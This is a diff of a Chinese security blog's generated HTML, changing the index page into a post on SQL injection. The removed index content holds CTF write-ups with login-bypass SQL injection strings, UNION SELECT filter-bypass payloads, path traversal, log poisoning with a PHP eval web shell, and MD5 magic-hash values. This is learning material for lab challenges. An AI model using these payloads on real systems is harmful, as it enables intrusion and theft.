@@ -20,30 +20,44 @@
     var CONFIG = {"hostname":"yun421.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="选择有时候比努力更重要">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Yun421">
-<meta property="og:url" content="http://yun421.top/index.html">
+  <meta name="description" content="# SQL注入  产生原理动态交互网站，实现交互利用用户输入拼接到SQL执行，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。   Burpsuite repeater模块中空格用‘+’或者‘%20’代替 SQL语句： 1select *from admin where username &#x3D; &amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://yun421.top/2021/04/16/SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Yun421">
-<meta property="og:description" content="选择有时候比努力更重要">
+<meta property="og:description" content="# SQL注入  产生原理动态交互网站，实现交互利用用户输入拼接到SQL执行，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。   Burpsuite repeater模块中空格用‘+’或者‘%20’代替 SQL语句： 1select *from admin where username &#x3D; &amp;#x27;">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/23627/Desktop/新建文件夹/Snipaste_2021-04-06_16-44-02.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406170058910.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406172121060.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406172958431.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406173352068.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406173406295.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406174232613.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406174917938.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406175301521.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406210119840.png">
+<meta property="og:image" content="c:/Users/23627/AppData/Roaming/Typora/typora-user-images/image-20210406213141234.png">
+<meta property="article:published_time" content="2021-04-16T13:27:08.000Z">
+<meta property="article:modified_time" content="2021-10-15T09:12:49.775Z">
 <meta property="article:author" content="Yun421">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/23627/Desktop/新建文件夹/Snipaste_2021-04-06_16-44-02.png">
 
-<link rel="canonical" href="http://yun421.top/">
+<link rel="canonical" href="http://yun421.top/2021/04/16/SQL%E6%B3%A8%E5%85%A5/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>Yun421</title>
+  <title>SQL注入 | Yun421</title>
   
 
 
@@ -162,86 +176,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/10/15/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/15/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-10-15 17:14:01" itemprop="dateCreated datePublished" datetime="2021-10-15T17:14:01+08:00">2021-10-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-24 19:29:57" itemprop="dateModified" datetime="2020-12-24T19:29:57+08:00">2020-12-24</time>
-              </span>
-
-          
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -257,10 +195,9 @@
       <meta itemprop="name" content="Yun421">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/16/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -290,7 +227,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <meta name="referrer" content="no-referrer" />
+        <meta name="referrer" content="no-referrer" />
 # SQL注入
 
 <h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><p>动态交互网站，实现交互利用用户输入<strong>拼接到SQL执行</strong>，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。</p>
@@ -597,503 +534,52 @@
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL语句设置与取消唯一键约束</span><br><span class="line">取消唯一键 alter table admin drop unique (username)</span><br><span class="line">设置唯一键 alter table admin add unique (username)</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+        
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
+    <div class="social-list">
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-10 21:35:58" itemprop="dateCreated datePublished" datetime="2021-03-10T21:35:58+08:00">2021-03-10</time>
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-15 17:13:34" itemprop="dateModified" datetime="2021-10-15T17:13:34+08:00">2021-10-15</time>
-              </span>
 
-          
-
+            <span class="label">RSS</span>
+          </a>
         </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1.前台校验，无法上传PHP文件、jpg图片，上传png图片马，抓包改后缀<br>2.我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR和PHP_INI_USER模式的 INI 设置，而且只要是在使用CGI／FastCGI模式的服务器上都可以使用.user.ini<br>auto_prepend_file和auto_append_file设置我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），<br>类似于在index.php中插入一句：require(./a.jpg);</p>
-<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）</p>
-<p>所以要求当前目录必须要有php文件getflag思路：我们上传一个.user.ini 文件设置一个文件1.jpg然后访问index.php就相当于包含了1.jpg<br>1.我们先上传.user.ini文件（当然文件名抓包之后再修改）</p>
-<p>2.然后再上传包含的PHP文件，访问/upload/index.php自动包含</p>
-<p>3.使用hackbar或者蚁剑寻找并读取flag</p>
-
-      
     </div>
+  </div>
 
-    
-    
-    
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传">
+      <i class="fa fa-chevron-left"></i> 文件上传
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/10/15/hello-world/" rel="next" title="Hello World">
+      Hello World <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-10 21:29:56" itemprop="dateCreated datePublished" datetime="2021-03-10T21:29:56+08:00">2021-03-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-15 17:13:28" itemprop="dateModified" datetime="2021-10-15T17:13:28+08:00">2021-10-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>普通文件包含</p>
-<p>常见的php伪协议大致四种</p>
-<p>1.php://filter  主要用于读取源码<br>2.php://input  经常使用file_get_contents获取php://input内容<br>3.data://  执行命令<br>4.file://  访问本地文件系统</p>
-<p>不能忘了convert，用于转换编码，缺少会报错</p>
-<p>用日志包含绕过，将执行的命令插入日志中nginx日志在(/var/log/httpd/access.log)目录下</p>
-<p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p>
-<p>1.简单来说，上面这个选项开启以后，上传文件，我们能够POST请求查看上传进度</p>
-<p>2.我们在session中写入我们要执行的代码</p>
-<p>3.用户可以自己定义Session ID，比如在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag，我们能够命名’sess_’后面的名字</p>
-<p>4.之后要执行就要包含这个session文件</p>
-<p>5.默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，就会清除进度信息</p>
-<p>6.于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是在执行系统命令前先执行完自己的代码，在文件上传中很常见</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/10/ctf.show%20web%E5%8C%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/10/ctf.show%20web%E5%8C%BA/" class="post-title-link" itemprop="url">ctf.show</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-10 21:25:16" itemprop="dateCreated datePublished" datetime="2021-03-10T21:25:16+08:00">2021-03-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-15 17:13:36" itemprop="dateModified" datetime="2021-10-15T17:13:36+08:00">2021-10-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>web签到题<br><img src="https://img-blog.csdnimg.cn/20210310191001410.png" alt="在这里插入图片描述"><br>本题考查信息搜集，F12查看源代码，<img src="https://img-blog.csdnimg.cn/20210310191045713.png" alt="在这里插入图片描述"><br>base64得到flag</p>
-<p>web2<br><img src="https://img-blog.csdnimg.cn/20210310191213355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示为最简单的sql注入，burp抓包<img src="https://img-blog.csdnimg.cn/2021031019142239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开始SQL注入测试，利用万能密码，登录成功<br>ps：PHP万能密码绕过，例如<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–<br><img src="https://img-blog.csdnimg.cn/20210310191839654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210310191903416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询数据库<img src="https://img-blog.csdnimg.cn/20210310191931594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查询数据库内数据表<img src="https://img-blog.csdnimg.cn/20210310191955965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整齐一点显示可以添加group_concat()<img src="https://img-blog.csdnimg.cn/20210310192042681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查询字段<img src="https://img-blog.csdnimg.cn/20210310192103180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查询字段内容<img src="https://img-blog.csdnimg.cn/20210310192131724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p>
-<p>web3<br><img src="https://img-blog.csdnimg.cn/20210310202720790.png" alt="在这里插入图片描述"><br>本题考查PHP伪协议+文件包含，payload=url=php://input，burp抓包<img src="https://img-blog.csdnimg.cn/2021031020290422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查看ctf_go_go_go文件<img src="https://img-blog.csdnimg.cn/20210310202939964.png" alt="在这里插入图片描述"><br>得到flag<br>ps：php伪协议详细<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
-<p>web4<br><img src="https://img-blog.csdnimg.cn/20210310203133264.png" alt="在这里插入图片描述"><br>与web3很像，测试文件包含未成功，url=../../../../../../../../../../etc/passwd，查看日志的默认目录，得到了日志文件，url=/var/log/nginx/access.log，burp抓包，编写一句话木马<?php @eval($_POST['a']);?><img src="https://img-blog.csdnimg.cn/20210310203534574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接<img src="https://img-blog.csdnimg.cn/20210310203605757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，在www目录下发现flag.txt文件<br><img src="https://img-blog.csdnimg.cn/20210310203628939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p>
-<p>web5<img src="https://img-blog.csdnimg.cn/20210310203813380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<?php error_reporting(0);
-
-    ?> <html lang="zh-CN">
-       <head>    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />    <title>ctf.show_web5</title> </head> <body> <center>    <h2>ctf.show_web5</h2>    <hr>    <h3>    </center>    <?php
-       $flag="";
-       $v1=$_GET['v1'];
-       $v2=$_GET['v2'];
-       if(isset($v1) && isset($v2)){
-           if(!ctype_alpha($v1)){
-               die("v1 error");
-           }
-           if(!is_numeric($v2)){
-               die("v2 error");
-           }
-           if(md5($v1)==md5($v2)){
-               echo $flag;
-           }
-       }else{
-       
-<pre><code>       echo &quot;where is flag?&quot;;
-   &#125;    ?&gt;
-   &lt;/body&gt; &lt;/html&gt; 
-</code></pre>
-<p>md5碰撞，0e开头的MD5值，默认为相等，v1为字符，v2为数值，<br>字母数字混合类（MD5值）：<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904</p>
-<p>大写字母类：<br>QLTHNDT<br>0e405967825401955372549139051580</p>
-<p>QNKCDZO<br>0e830400451993494058024219903391</p>
-<p>EEIZDOI<br>0e782601363539291779881938479162</p>
-<p>纯数字类：<br>240610708<br>0e462097431906509019562988736854<br>构造v1=QNKCDZO&amp;v2=240610708<br>得到flag</p>
-<p>web6<br><img src="https://img-blog.csdnimg.cn/20210310204511663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burp抓包，SQL注入<br><img src="https://img-blog.csdnimg.cn/20210310204524615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现空格被过滤，用/**/绕过<img src="https://img-blog.csdnimg.cn/20210310204615418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210310204630272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查数据库名<img src="https://img-blog.csdnimg.cn/20210310204721932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询数据表名<img src="https://img-blog.csdnimg.cn/20210310204753834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询表内字段名<img src="https://img-blog.csdnimg.cn/20210310204814404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询字段信息<img src="https://img-blog.csdnimg.cn/20210310204839508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p>
-<p>web7<br>SQL注入，构造万能密码，空格被过滤，/<strong>/绕过<br><img src="https://img-blog.csdnimg.cn/20210310205134235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burp抓包<img src="https://img-blog.csdnimg.cn/20210310205201956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>id=1/</strong>/or/<strong>/1=1/</strong>/<strong>/union/</strong>/select/<strong>/1,flag,3/</strong>/from/**/flag#<br>得到flag</p>
-<p>web9<img src="https://img-blog.csdnimg.cn/20210310205405737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试万能密码以及过滤绕过，各种方法均没有回显，查看网站源代码， 没有提示，dir-search扫描目录，发现了一个robots.txt文件，访问发现index.phps源代码文件，确定源码泄露，访问index.phps下载源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="number">2</span>       <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;  </span><br><span class="line"><span class="number">3</span>       <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];    </span><br><span class="line"><span class="number">4</span>       <span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123; </span><br><span class="line"><span class="number">5</span>           <span class="keyword">die</span>(<span class="string">&quot;password    error&quot;</span>);  </span><br><span class="line"><span class="number">6</span>       &#125;  </span><br><span class="line"><span class="number">7</span>       <span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password=&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;  </span><br><span class="line"><span 